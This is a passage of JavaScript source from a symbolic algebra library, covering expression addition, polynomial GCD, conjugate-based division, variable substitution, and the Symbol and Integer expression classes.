      return new Multiplication(y, x);
    }

  };

  function Iterator() {
  }
  if (typeof Symbol === "function") {
    Iterator.prototype[Symbol.iterator] = function () {
      return this;
    };
    Object.defineProperty(Iterator.prototype, "done", {
      get: function () {
        return this.value == null;
      }
    });
  }

  function TermFactorsIterator(e) {
    this.value = undefined;
    this.e = e;
  }
  TermFactorsIterator.prototype = Object.create(Iterator.prototype);
  TermFactorsIterator.prototype.next = function () {
    this.value = this.e instanceof Multiplication ? this.e.b : (this.e instanceof Integer || this.e instanceof Expression.Complex ? null : this.e);
    this.e = this.e instanceof Multiplication ? this.e.a : undefined;
    return this;
  };

  function termFactors(e) {
    return new TermFactorsIterator(e);
  }

  var compare4Addition = function (x, y) {
    // undefined | Symbol | Exponentiation | Multiplication
    var i = termFactors(x);
    var j = termFactors(y);
    var a = i.next().value;
    var b = j.next().value;
    while (a != null && b != null) {

      //!
      // x^3*y^2, x^2*y^3
      var cmp = 0 - compare(getBase(a), getBase(b));
      if (cmp === 0) {
        cmp = compare(getExponent(a), getExponent(b));
      }
      if (cmp !== 0) {
        return cmp;
      }
      a = i.next().value;
      b = j.next().value;
    }
    return a != null ? +1 : (b != null ? -1 : 0);
  };

  Expression.prototype.addExpression = function (x) {
    var y = this;
    if (x.equals(Expression.ZERO)) {
      return y;
    }
    if (y.equals(Expression.ZERO)) {
      return x;
    }

    //!2019-02-16
    if (x instanceof Multiplication && x.b instanceof IdentityMatrix) {
      var t = getIdentityMatrixCoefficient(y);
      if (t != null) {
        return x.a.add(t).multiply(x.b);
      }
    } else if (x instanceof IdentityMatrix) {
      var t = getIdentityMatrixCoefficient(y);
      if (t != null) {
        return Expression.ONE.add(t).multiply(x);
      }
    }
    if (y instanceof Multiplication && y.b instanceof IdentityMatrix) {
      var t = getIdentityMatrixCoefficient(x);
      if (t != null) {
        return t.add(y.a).multiply(y.b);
      }
    } else if (y instanceof IdentityMatrix) {
      var t = getIdentityMatrixCoefficient(x);
      if (t != null) {
        return t.add(Expression.ONE).multiply(y);
      }
    }
    //!2019-02-16

    //!new 2019-09-30
    if (x instanceof Expression.Addition && y instanceof Expression.Matrix) {//TODO: 
      return x.a.add(x.b.add(y));
    }
    if (x instanceof Expression.Matrix && y instanceof Expression.Addition) {
      return x.add(y.a).add(y.b);
    }
    if (x instanceof Expression.Addition && y instanceof Expression.Addition) {
      if (x.b instanceof Expression.Matrix && y.b instanceof Expression.Matrix) {
        return x.a.add(x.b.add(y));
      }
    }

    // rest

    var i = x.summands();
    var j = y.summands();
    var a = i.next().value;
    var b = j.next().value;
    var s = [];
    //a + b, compare4Addition("a", "b") > 0
    while (a != null && b != null) {
      var c = compare4Addition(a, b);
      if (c < 0) {
        s.push(a);
        a = i.next().value;
      } else if (c > 0) {
        s.push(b);
        b = j.next().value;
      } else {
        var constant = getConstant(a).add(getConstant(b));
        var term = getTerm(a);
        var last = term == undefined ? constant : constant.multiply(term);
        if (!last.equals(Expression.ZERO)) {
          s.push(last);
        }
        a = i.next().value;
        b = j.next().value;
      }
    }
    while (a != null) {
      s.push(a);
      a = i.next().value;
    }
    while (b != null) {
      s.push(b);
      b = j.next().value;
    }
    if (s.length === 0) {
      return Expression.ZERO;
    }
    var accumulator = s[s.length - 1];
    for (var k = s.length - 2; k >= 0; k -= 1) {
      var currentValue = s[k];
      accumulator = new Addition(accumulator, currentValue);
    }
    return accumulator;
  };

  var divideByInteger = function (e, f) {
    if (f.equals(Expression.ZERO)) {
      throw new RangeError("ArithmeticException");
    }
    var result = Expression.ZERO;
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      var rest = Expression.ONE;
      var t = undefined;
      // TODO: check, fix?
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        var z = y;
        if (z instanceof Integer || z instanceof Expression.Complex) {
          if (t != undefined) {
            console.warn("!");
            t = t.multiply(z);
          } else {
            t = z;
          }
        } else {
          if (rest === Expression.ONE) {
            rest = z;
          } else {
            rest = z.multiply(rest);
          }
        }
      }
      if (!(t instanceof Expression.Complex)) {
      if (!(t instanceof Integer)) {
        throw new RangeError();
      }
      }
      //result = result.add(t.divide(f).multiply(rest));
      result = result.add(t.truncatingDivide(f).multiply(rest));
    }
    return result;
  };

  Expression.getCoefficients = function (e, v) {
    var result = [];
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      var d = Expression.ZERO;
      var c = Expression.ONE;
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        var t = y;
        for (var variables = getVariableInternal(t), ve = variables.next().value; ve != null; ve = variables.next().value) {
          if (ve.v.equals(v)) {
            d = d.add(ve.e);
          } else {
            c = c.multiply(ve.e === Expression.ONE ? ve.v : ve.v.pow(ve.e));
          }
        }
      }
      var tmp = {
        coefficient: c,
        degree: d
      };
      var k = result.length - 1;
      while (k >= 0 && tmp.degree.compareTo(result[k].degree) < 0) {
        k -= 1;
      }
      if (k >= 0 && tmp.degree.compareTo(result[k].degree) === 0) {
        result[k].coefficient = tmp.coefficient.add(result[k].coefficient);
      } else {
        result.push(tmp);
        var i = result.length - 1;
        while (i >= k + 2) {
          result[i] = result[i - 1];
          i -= 1;
        }
        result[k + 1] = tmp;
      }
    }
    return result;
  };

  //TODO: remove
  var getFirstAdditionOperand = function (x) {
    var result = x;
    while (result instanceof Addition) {
      result = result.a;
    }
    return result;
  };
  //TODO: remove
  var getLastMultiplicationOperand = function (x) {
    var result = x;
    while (result instanceof Multiplication) {
      result = result.b;
    }
    return result;
  };

  function VIterator(v) {
    if (v == undefined) {
      throw new TypeError();
    }
    this.value = undefined;
    this.v = v;
  }
  VIterator.prototype = Object.create(Iterator.prototype);
  VIterator.prototype.next = function () {
    this.value = this.v;
    this.v = undefined;
    return this;
  };

  function VariablesIterator(v, additions) {
    if (additions == undefined) {
      throw new TypeError();
    }
    this.value = undefined;
    this.v = v;
    this.additions = additions;
  }
  VariablesIterator.prototype = Object.create(Iterator.prototype);
  VariablesIterator.prototype.next = function () {
    var x = this.additions.next().value;
    var value = null;
    if (x == null) {
      value = null;
    } else if (x instanceof Expression.Symbol) {
      value = {v: new Exponentiation(this.v, x), e: Expression.ONE};
    } else if (x instanceof Multiplication && x.a instanceof Integer && x.b instanceof Expression.Symbol) {
      value = {v: new Exponentiation(this.v, x.b), e: x.a};
    } else if (x instanceof Integer) {
      value = {v: this.v, e: x};
    } else if (x instanceof Expression.Division && x.a instanceof Integer && x.b instanceof Integer) {//!new 2019-06-16
      value = {v: this.v, e: x};
    } else if (x instanceof Expression.Division && x.a instanceof Multiplication && x.a.a instanceof Integer && x.a.b instanceof Expression.Symbol && x.b instanceof Integer) {//!new 2019-06-16
      if (this.v instanceof Integer) {
        value = {v: new Exponentiation(this.v, x.a.b), e: x.divide(x.a.b)};
      } else {
      value = {v: this.v, e: x};//?
      }
    } else {
      if (this.v instanceof Integer && x instanceof Division && x.a instanceof Expression.Symbol && x.b instanceof Integer) {
        value = {v: new Exponentiation(this.v, x.a), e: x.divide(x.a)};
      } else {
      throw new RangeError();
      }
    }
    this.value = value;
    return this;
  };

  var getVariableInternal = function (t) {
    if (t instanceof Expression.ExponentiationOfMinusOne) {//TODO: ?
      return new VIterator({v: t, e: Expression.ONE});
    }
    if (t instanceof Expression.ExponentiationOfImaginaryUnit) {//TODO: ?
      return new VIterator({v: t, e: Expression.ONE});
    }
    var v = getBase(t);
    var e = getExponent(t);

    //!new 2017-05-08
    if (enableEX) {
      if (!(e instanceof Integer)) {
        var additions = e.summands();
        return new VariablesIterator(v, additions);
      }
    }
    //!
    return new VIterator({v: v, e: e});
  };

  var getVariable = function (e) {
    //? square roots at first
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        if (y instanceof NthRoot) {
        //TODO: assert(y instanceof Integer)
          return y;
        }
      }
    }
    //?

    var result = getVariableInternal(getLastMultiplicationOperand(getFirstAdditionOperand(e))).next().value.v;
    //!?
    //if (result instanceof NthRoot) {
    //  return undefined;
    //}
    //
    if (result instanceof Expression.Complex) {
      return undefined;//?
    }
    if (result instanceof Integer) {
      return undefined;//?
    }
    return result;
  };

  Expression.getVariable = getVariable;

  var integerGCD = function (x, y) {
    var a = x;
    var b = y;
    while (!b.equals(Expression.ZERO)) {
      var t = a.remainder(b);
      a = b;
      b = t;
    }
    return a;
  };

  //var getIntegerContent = function (x) {
  //  return x instanceof Expression.Complex ? integerGCD(x.real, x.imaginary) : x;
  //};

  var complexGCD = function (a, b) {//?
    // return integerGCD(getIntegerContent(a), getIntegerContent(b));
    var x = integerGCD(a, b);
    if (x instanceof Expression.Complex) {
      //TODO: ?
      if (x.real.compareTo(Expression.ZERO) === 0) {
        return x.imaginary;
      }
    }
    if (x instanceof Expression.Integer) {
      if (x.compareTo(Expression.ZERO) < 0) {
        x = x.negate();
      }
    }
    return x;
  };

  // http://www-troja.fjfi.cvut.cz/~liska/ca/node33.html
  var gcd = function (a, b, v) {
    if (v == undefined) {
      return complexGCD(getConstant(a), getConstant(b));
    }
    
    var r = getReplacement(a, getReplacement(b, v));
    if (!r.equals(v)) {
      return substitute(substitute(a, v, r, inverseReplacement(r, v)).gcd(substitute(b, v, r, inverseReplacement(r, v))), v, inverseReplacement(r, v), r);
    }

    return Polynomial.polynomialGCD(Polynomial.toPolynomial(a, v), Polynomial.toPolynomial(b, v)).calcAt(v);
  };

  // ! new 21.12.2013 (square roots)

  var getConjugateFactor = function (e) {
    var r = 1 / 0;
    var p = undefined;
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        if (y instanceof NthRoot) {
          var degree = y.getDegree();
          var i = y.a instanceof Integer ? y.a : null;
          if (i == null) {
            i = QuadraticInteger.toQuadraticInteger(y.a);
          }
          if (i == null) {
            throw new TypeError();
          }
          if (r > degree && r === 1 / 0) {
            //TODO: check !!!
            p = i;
            r = degree;
          } else if (r === degree) {
            //TODO: assert(y instanceof Integer)
            if (i != null) {
              var z = integerGCD(p, i);
              if (!z.isUnit()) {
                p = z;//!
              }
              if (z.isUnit() && !(z instanceof Integer) && (p.isUnit() || i.isUnit())) {
                p = z;//?
              }
            } else {
              throw new TypeError();
            }
          }
        }
      }
    }
    return {p: p, r: r};
  };

  // TODO: test
  var getConjugate = function (a) {
    var e = undefined;
    e = Expression.getComplexConjugate(a);
    if (e != undefined) {
      return e;
    }
    e = Expression.getNthRootConjugate(a);
    if (e != undefined) {
      return e;
    }
    return undefined;
  };
  
  Expression.getConjugate = getConjugate;

  // https://en.wikipedia.org/wiki/Conjugate_(square_roots)
  Expression.getNthRootConjugate = function (e) {
    if (e instanceof Integer) {
      //optimize to not stop the debugger at common code
      return null;
    }
    if (e instanceof SquareRoot) {
      //optimize to not stop the debugger at common code
      return e;
    }
    //!2019-10-20 a workaround
    if (e instanceof Addition &&
        e.a instanceof Multiplication && e.a.a instanceof Integer && e.a.b instanceof CubeRoot &&
        e.b instanceof Multiplication && e.b.a instanceof Integer && e.b.b instanceof CubeRoot) {
      // (aa-ab+bb)
      return e.a._pow(2).subtract(e.a.multiply(e.b)).add(e.b._pow(2));
    }
    //!
    
  //TODO: fix
  //if (true) return undefined;
    var tmp = getConjugateFactor(e);
    var p = tmp.p;
    var r = tmp.r;
    if (p == undefined) {
      return undefined;
    }
    var polynomial = Polynomial.of();
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      var degree = 0;
      var coefficient = Expression.ONE;
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        if (y instanceof NthRoot && r === y.getDegree()) {
          var i = y.a instanceof Integer ? y.a : null;
          if (i == null) {
            i = QuadraticInteger.toQuadraticInteger(y.a);
          }
          if (i != null) {
            var j = 0;
            var a = i;
            if (p.isUnit()) {
              if (a.isUnit()) {
                j = 1;
                a = a.truncatingDivide(p);
                // a == 3+sqrt(2), p == 1+sqrt(2)
                while (a.primeFactor().equals(p)) {
                  j += 1;
                  a = a.truncatingDivide(p);
                }
              } else {
                if (!(a instanceof Integer)) {
                //TODO: ?
                //throw new TypeError();
                  var tmp = a.truncatingDivide(p);
                  if (tmp.a * tmp.b >= 0) {
                    j = 1;
                    a = tmp;
                  }
                }
              }
            } else {
              while (a.isDivisibleBy(p) && j < r) {//?
                a = a.truncatingDivide(p);
                j += 1;
              }
            }
            a = a.toExpression();
            coefficient = coefficient.multiply(a._nthRoot(r));
            degree += j;
          } else {
            throw new TypeError();
          }
        } else {
          coefficient = coefficient.multiply(y);
        }
      }
      //TODO: efficiency ?
      polynomial = polynomial.add(Polynomial.of(coefficient).shift(degree));
    }
    var n = r;
    var x = p;
    x = x.toExpression();
    var e = polynomial;
    var conjugate = Polynomial.of(n % 2 === 1 ? Expression.ONE : Expression.ONE.negate());
    while (e.getDegree() > 0) {
      var k = e.getDegree();
      var ak = Polynomial.of(e.getLeadingCoefficient());
      var m = Polynomial.of(Expression.ONE).shift(n - k);
      var p = e.multiply(m).subtract(ak.shift(n)).add(ak.multiply(Polynomial.of(x)));
      while (p.getDegree() >= k) {
        var d = p.getDegree();
        var lc = p.getLeadingCoefficient();
        m = m.multiply(ak);
        p = p.multiply(ak);
        var t = Polynomial.of(lc.negate()).shift(d - k);
        m = m.add(t);
        p = p.add(e.multiply(t));
      }
      e = p;
      conjugate = conjugate.multiply(m);
    }
    return conjugate.calcAt(x._nthRoot(n));
  };

  // without the checks
  Expression.collectLinearEquationVariables = function (e) {
    if (e instanceof Division) {
      throw new RangeError();
    }
    var list = [];
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      var v = undefined;
      var c = Expression.ONE;
      var NO_VARIABLE = "";
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        if (y instanceof Expression.Symbol && v == undefined) {
          v = y;
        } else {
          if (!(y instanceof Integer) && !(y instanceof NthRoot)) {
            if (v == undefined) {
              v = NO_VARIABLE;
            }
          }
          c = c.multiply(y);
        }
      }
      if (v == undefined) {
        v = NO_VARIABLE;
      }
      var variable = v === NO_VARIABLE ? "" : v.toString();
      list.push({c: c, v: variable});
    }
    return list;
  };

  var has = function (e, Class) {
    if (e instanceof Class) {
      return true;
    }
    if (e instanceof BinaryOperation) {
      if (has(e.b, Class)) {
        return true;
      }
      return has(e.a, Class);
    }
    if (e instanceof Negation) {
      return has(e.b, Class);
    }
    
    if (e instanceof Expression.Function) {
      return has(e.a, Class);
    }
    return false;//?
  };
  Expression.has = has;

  var inverseReplacement = function (e, v) {
    var t = v;
    while (!e.equals(v)) {
      if (e instanceof Expression.Exponentiation && e.b instanceof Multiplication && v instanceof Exponentiation) {
        t = t.pow(e.b.a.inverse());
        e = e.pow(e.b.a.inverse());
      } else if (e instanceof Expression.Exponentiation) {
        t = t.pow(getExponent(e).inverse());
        e = getBase(e);
      } else if (e instanceof Addition) {
        if (!(e.b instanceof Integer)) {
          throw new RangeError();
        }
        t = t.subtract(e.b);
        e = e.a;
      } else if (e instanceof Multiplication) {
        if (!(e.a instanceof Integer)) {
          throw new RangeError();
        }
        t = t.divide(e.a);
        e = e.b;
      } else if (e instanceof Division) {
        if (!(e.b instanceof Integer)) {
          throw new RangeError();
        }
        t = t.multiply(e.b);
        e = e.a;
      } else {
        if (Expression.E === e && getBase(v) === Expression.E) {//!new 2019-09-23
          t = t.pow(getExponent(v));
          e = v;
        } else {
          throw new TypeError();
        }
      }
    }
    return t;
  };

  var h = function (e, n, q) {
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        if (getBase(q).equals(getBase(y))) {
          n = n.lcm(getExponent(y).getDenominator());
        }
      }
    }
    return n;
  };

  var getReplacement = function (e, v) {
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        if (y instanceof Expression.Exponentiation && (y.a instanceof Expression.Symbol || y.a instanceof Integer && y.a.compareTo(Expression.ONE) > 0) && y.b instanceof Expression.Division) {
          if (getBase(v).equals(y.a)) {
            v = new Expression.Exponentiation(y.a, y.b.b.lcm(getExponent(v).getNumerator()));
          }
        } else {
          //!TODO: fix
          if (y instanceof Expression.Exponentiation && Expression.has(y.a, Expression.Symbol) && y.b instanceof Expression.Division) {
            if (getBase(v).equals(y.a)) {
              v = new Expression.Exponentiation(y.a, y.b.b.lcm(getExponent(v).getNumerator()));
            } else if (getBase(v) instanceof Expression.Symbol) {
              if (!(y.a instanceof Expression.Addition && y.a.a.divide(getBase(v)) instanceof Integer && y.a.b instanceof Integer) || !(y.b instanceof Division && y.b.a instanceof Integer && y.b.b instanceof Integer)) {
                throw new TypeError();
              }
              var n = y.b.getDenominator();
              n = h(e, n, y);//!
              //TODO: ?
              //debugger;
              // sqrt(y.a.a + y.a.b) = t
              // k * v = y.a.a = t**2 - y.a.b
              // v = (t**2 - y.a.b) / (y.a.a / v)
              var t = getBase(v).pow(n).subtract(y.a.b).divide(y.a.a.divide(getBase(v)));
              return t;
            }
          }
        }
      }
    }
    return v;
  };

  var substitute = function (e, a, b, inv) {
    if (e.equals(a)) {
      return b;
    }
    if (e instanceof Expression.Exponentiation) {
      if (e.equals(inv)) {
        return a;
      }
      if (getBase(e).equals(getBase(inv))) {//!new 2019-09-23
        return a.pow(getExponent(e).divide(getExponent(inv)));
        //TODO: add an assertion below 
      }
    }

    if (e instanceof Expression.Addition) {
      return substitute(e.a, a, b, inv).add(substitute(e.b, a, b, inv));
    }
    if (e instanceof Expression.Multiplication) {
      return substitute(e.a, a, b, inv).multiply(substitute(e.b, a, b, inv));
    }
    if (e instanceof Expression.Exponentiation) {
      var x = substitute(e.a, a, b, inv);
      var y = substitute(e.b, a, b, inv);
      //console.log(x + ' ' + y + ' ' + a + ' ' + b + ' ' + inv);
      if (x instanceof Expression.Exponentiation &&
          getBase(x).equals(getBase(inv)) &&
          getExponent(inv).getDenominator().remainder(Expression.TWO).equals(Expression.ZERO)) {
        //TODO: FIX
        return getBase(x).pow(getExponent(x).multiply(y));
      }
      return x.pow(y);
    }
    return e;
  };

  Expression.prototype.divideExpression = function (x) {
    var y = this;
    
    //if (Expression.getIdentityMatrixCoefficient(x) != undefined) {
    //  if (y instanceof Expression.Matrix) {
    //    return Expression.getIdentityMatrixCoefficient(x).divide(y);
    //  }
    //  return Expression.makeIdentityMatrixWithCoefficient(Expression.getIdentityMatrixCoefficient(x).divide(y));
    //}
    //if (Expression.getIdentityMatrixCoefficient(y) != undefined) {
    //  if (x instanceof Expression.Matrix) {
    //    return x.divide(Expression.getIdentityMatrixCoefficient(y));
    //  }
    //  return Expression.makeIdentityMatrixWithCoefficient(x.divide(Expression.getIdentityMatrixCoefficient(y)));
    //}

    //if (has(x, IdentityMatrix)) {//?
    //  throw new RangeError("NotSupportedError");
    //}
    //if (has(x, MatrixSymbol)) {
    //  throw new RangeError("NotSupportedError");
    //}

    if (x instanceof Multiplication && x.b instanceof IdentityMatrix) {
      return x.a.divide(y).multiply(x.b);
    } else if (x instanceof IdentityMatrix) {
      return Expression.ONE.divide(y).multiply(x);
    }
    if (y instanceof Multiplication && y.b instanceof IdentityMatrix) {
      return x.divide(y.a).multiply(y.b);
    } else if (y instanceof IdentityMatrix) {
      return x.multiply(y);
    }

    if (has(y, MatrixSymbol)) {
      throw new RangeError("NotSupportedError");
    }

    if (x instanceof Expression.Matrix && y instanceof Expression.Matrix) {
      // TODO: callback ???
      return new Expression.Matrix(x.matrix.multiply(y.matrix.inverse()));
    }
    if (x instanceof Expression.Matrix && y instanceof Expression) {
      //return new Expression.Matrix(x.matrix.scale(y.inverse()));
      return x.multiply(y.inverse());
    }
    if (x instanceof Expression && y instanceof Expression.Matrix) {
      if (Expression.callback != undefined) {
        Expression.callback(new Expression.Event(y.matrix.getDeterminantEventType("inverse").type, y));
      }
      //return new Expression.Matrix(y.matrix.inverse().scale(x));
      return new Expression.Matrix(y.matrix.inverse()).multiply(x);
    }

    if (y.equals(Expression.ZERO)) {
      //TODO: fix?
      throw new RangeError("ArithmeticException");
    }
    if (x.equals(Expression.ZERO)) {
      return Expression.ZERO;
    }
    if (y.equals(Expression.ONE)) {
      return x;
    }

    //!!! new (21.12.2013)
    if (true) { //TODO: remove hack!
      var e = getConjugate(y);
      if (e != undefined) {
        if (e.equals(Expression.ONE)) {
          throw new TypeError(); // "assertion"
        }
        return x.multiply(e).divide(y.multiply(e));
      }
    }

    if (true) {//!new 2017-11-25
      var c = Expression.getComplexConjugate(x);
      if (c != undefined) {
        var a = x.add(c).divide(Expression.TWO);
        var b = x.subtract(c).multiply(Expression.I.negate()).divide(Expression.TWO);
        var g = (a.equals(Expression.ZERO) ? y : a.gcd(y)).gcd(b.equals(Expression.ZERO) ? y : b.gcd(y));
        if (!g.equals(Expression.ONE)) {
          x = a.divide(g).add(b.divide(g).multiply(Expression.I));
          y = y.divide(g);
        }
        if (y.isNegative()) {
          x = x.negate();
          y = y.negate();
        }
        return y.equals(Expression.ONE) ? x : new Division(x, y);
      }
    }//!
    
    // check if y is instance of Integer to avoid issues with nth-roots (?) - see a test
    //TODO: investigate
    var v = y instanceof Integer ? undefined : getVariable(x);//???
    //var v = getVariable(x);//???
    //TODO: move?


    //!2019-06-16
    if (v != null) { // e**(1/2)
      v = getVariable(v);
      var r = getReplacement(y, getReplacement(x, v));
      if (!r.equals(v)) {
        var ir = inverseReplacement(r, v);
        var a = substitute(x, v, r, ir);
        var b = substitute(y, v, r, ir);
        //console.log(a + ' ' + b);
        var t = a.divide(b);
        a = substitute(t.getNumerator(), v, ir, r);
        b = substitute(t.getDenominator(), v, ir, r);
        return b.equals(Expression.ONE) ? a : new Expression.Division(a, b);
      }
    }


    // gcd
    if (v == undefined) {
      var g = complexGCD(getConstant(x), getConstant(y));
      if (!g.equals(Expression.ONE)) {
        x = divideByInteger(x, g);
        y = divideByInteger(y, g);
        return x.divide(y);
      } 
    } else {
      var px = Polynomial.toPolynomial(x, v);
      var py = Polynomial.toPolynomial(y, v);
      //!TODO: remove - performance optimization
      var t = px.divideAndRemainder(py, "undefined");
      if (t != undefined && t.remainder.equals(Polynomial.ZERO)) {
        return t.quotient.calcAt(v);
      }
      //!
      var g = Polynomial.polynomialGCD(px, py);
      if (g.getDegree() !== 0 || !g.getLeadingCoefficient().equals(Expression.ONE)) { // g !== 1
        var x2 = px.divideAndRemainder(g, "throw").quotient;
        var y2 = py.divideAndRemainder(g, "throw").quotient;
        return x2.calcAt(v).divide(y2.calcAt(v));
      }
    }

    //var lc = getConstant(getLeadingCoefficient(y, v));
    //var lc = getConstant(getLeadingCoefficient(y, getVariable(y)));
    var lc = getConstant(getFirstAdditionOperand(y));
    if (lc.compareTo(Expression.ZERO) < 0) {
      return x.negate().divide(y.negate());
    }
    return new Division(x, y);
  };

  function Expression() {
    throw new TypeError("Do not call for better performance");
  }

  Expression.callback = undefined;
  Expression.Event = function (type, data, second) {
    second = second == undefined ? undefined : second;
    this.type = type;
    this.data = data;
    this.second = second;
  };

  Expression.prototype.compare4Multiplication = function (y) {
    throw new TypeError(this.toString());
  };
  Expression.prototype.compare4MultiplicationInteger = function (x) {
    throw new TypeError();
  };
  Expression.prototype.compare4MultiplicationSymbol = function (x) {
    throw new TypeError();
  };
  Expression.prototype.compare4MultiplicationNthRoot = function (x) {
    throw new TypeError();
  };

  Expression.prototype.negate = function () {
    return Expression.ONE.negate().multiply(this);
  };
  Expression.prototype.add = function (y) {
    return y.addExpression(this);
  };
  Expression.prototype.subtract = function (y) {
    return this.add(y.negate());
  };
  Expression.prototype.divide = function (y) {
    //!2019-04-22
    if (this.equals(y)) { //!TODO: remove - a hack to avoid some exceptions
      if (this instanceof IdentityMatrix) {
        return this;
      }
      return Expression.ONE;
    }
    return y.divideExpression(this);
  };
  Expression.prototype.multiply = function (y) {
    return y.multiplyExpression(this);
  };
  Expression.prototype.pow = function (y) {
    return y.powExpression(this);
  };
  Expression.prototype.getDenominator = function () {
    //TODO: FIX!!!!
    return this instanceof Division ? this.b : Expression.ONE;
  };
  Expression.prototype.getNumerator = function () {
    //TODO: FIX!!!!
    return this instanceof Division ? this.a : this;
  };
  Expression.prototype.inverse = function () {
    return Expression.ONE.divide(this);
  };
  Expression.prototype.exp = function () {
    return Expression.E.pow(this);
  };


  //TODO: use in Expression#getCoefficients -?
  var variables = function (e) {
    var result = [];
    for (var additions = e.summands(), x = additions.next().value; x != null; x = additions.next().value) {
      for (var multiplications = x.factors(), y = multiplications.next().value; y != null; y = multiplications.next().value) {
        for (var variables = getVariableInternal(y), ve = variables.next().value; ve != null; ve = variables.next().value) {
          if (!(ve.v instanceof Integer)) {
            result.push(ve.v);
          }
        }
      }
    }
    return result;
  };

  //TODO: remove - performance optimization
  var getCommonVariable = function (x, y) {
    var a = variables(x);
    var b = variables(y);
    /*
    for (var i = 0; i < a.length; i += 1) {
      if (a[i] instanceof NthRoot) {
        return a[i];
      }
    }
    for (var i = 0; i < b.length; i += 1) {
      if (b[i] instanceof NthRoot) {
        return b[i];
      }
    }
    */
    for (var i = 0; i < a.length; i += 1) {
      if (a[i] instanceof Addition) {
        return variables(a[i])[0];//TODO: fix
      }
    }
    for (var i = 0; i < b.length; i += 1) {
      if (b[i] instanceof Addition) {
        return variables(b[i])[0];//TODO: fix
      }
    }
    for (var i = 0; i < a.length; i += 1) {
      for (var j = 0; j < b.length; j += 1) {
        if (a[i].equals(b[j])) {
          return a[i];
        }
      }
    }
    return null;
  };

  // TODO: fix or remove ?
  Expression.prototype.gcd = function (x) {
    //return gcd(this, x, getVariable(this) || getVariable(x));
    return gcd(this, x, getCommonVariable(this, x));
  };
  Expression.prototype.lcm = function (x) {
    return this.divide(this.gcd(x)).multiply(x);
  };

  //TODO: merge with ExpressionParser.js ?!?
  var precedence = {
    binary: {
      ".^": 5,
      "^": 5,
      "*": 3,
      "/": 3,
      "+": 2,
      "-": 2
    },
    unary: {
      "-": 5//HACK
    }
  };

  Expression.Symbol = function (symbol) {
    //Expression.call(this);
    this.symbol = symbol;
  };

  Expression.Symbol.prototype = Object.create(Expression.prototype);

  Expression.Symbol.prototype.compare4Multiplication = function (y) {
    return y.compare4MultiplicationSymbol(this);
  };
  Expression.Symbol.prototype.compare4MultiplicationInteger = function (x) {
    return -1;
  };
  Expression.Symbol.prototype.compare4MultiplicationSymbol = function (x) {
    return x.symbol < this.symbol ? -1 : (this.symbol < x.symbol ? +1 : 0);
  };
  Expression.Symbol.prototype.compare4MultiplicationNthRoot = function (x) {
    return -1;
  };

  Expression.Symbol.prototype.toString = function (options) {
    if (this.symbol === '\u2147') {
      return 'e';//!
    }
    return this.symbol;
  };


  Expression.prototype.addInteger = function (x) {
    return this.addExpression(x);
  };
  Expression.prototype.multiplyInteger = function (x) {
    return this.multiplyExpression(x);
  };
  Expression.prototype.divideInteger = function (x) {
    return this.divideExpression(x);
  };

  function Integer(value) {
    //Expression.call(this);
    this.value = value;
  }

  Integer.prototype = Object.create(Expression.prototype);
  
  Integer.prototype.powExpression = function (x) {
    var y = this;
    if (x instanceof IdentityMatrix) {
      return new IdentityMatrix(x.symbol);
    }
    if (x instanceof MatrixSymbol) {
      if (y.equals(Expression.ZERO)) {
        return Expression.ONE;
      }
      if (y.equals(Expression.ONE)) {
        return x;
      }
      return new Exponentiation(x, y);//?
    }
    if (y.compareTo(Expression.ZERO) < 0) {
      return Expression.ONE.divide(x.pow(y.negate()));
    }
    if (x instanceof Expression.Matrix) {
      if (y.compareTo(Expression.ONE) > 0) {
        if (Expression.callback != undefined) {
          Expression.callback(new Expression.Event("pow", x, new Expression.Matrix(Matrix.I(1).map(function () { return y; }))));
        }
      }
      if (y.toNumber() > 9007199254740991) {
        return x.pow(y.truncatingDivide(Expression.TWO)).pow(Expression.TWO).multiply(x.pow(y.remainder(Expression.TWO)));
      }
      return new Expression.Matrix(x.matrix.pow(y.toNumber()));
    }
    if (y.equals(Expression.ZERO)) {
      return Expression.ONE;
    }
    if (y.equals(Expression.ONE)) {
      return x;
    }

    if (x instanceof Expression.Symbol) {
      return new Exponentiation(x, y);
    }
    if (x instanceof Exponentiation) {
      var t = x.b.multiply(y);
      if (t.getNumerator() instanceof Integer && t.getDenominator() instanceof Integer) {//TODO: ?
        var i = t.getNumerator().truncatingDivide(t.getDenominator());
        if (i.compareTo(Expression.ZERO) > 0) {
          return x.a.pow(i).multiply(x.a.pow(t.subtract(i)));
        }
      }
      return x.a.pow(x.b.multiply(y));
    }
    if (x instanceof Integer && (x.compareTo(Expression.ZERO) === 0 || x.compareTo(Expression.ONE) === 0 || x.compareTo(Expression.ONE.negate()) === 0)) {
      return y.remainder(Expression.TWO).compareTo(Expression.ZERO) === 0 ? x.multiply(x) : x;
    }
    if (x.equals(Expression.I)) {
      y = y.remainder(Expression.TWO.add(Expression.TWO));
      return Expression.pow(x, y);
    }
    // assert(x instanceof Operation || x instanceof Integer);
    return Expression.pow(x, y.toNumber());
  };

  Integer.prototype.compare4Multiplication = function (y) {
    return y.compare4MultiplicationInteger(this);
  };
  Integer.prototype.compare4MultiplicationInteger = function (x) {
    return x.compareTo(this);
    //return 0;
  };
  Integer.prototype.compare4MultiplicationSymbol = function (x) {
    return +1;
  };
  Integer.prototype.compare4MultiplicationNthRoot = function (x) {
    return +1;
  };

  Integer.prototype.negate = function () {
    return new Integer(BigInteger.unaryMinus(this.value));
  };
  Integer.prototype.isUnit = function () {
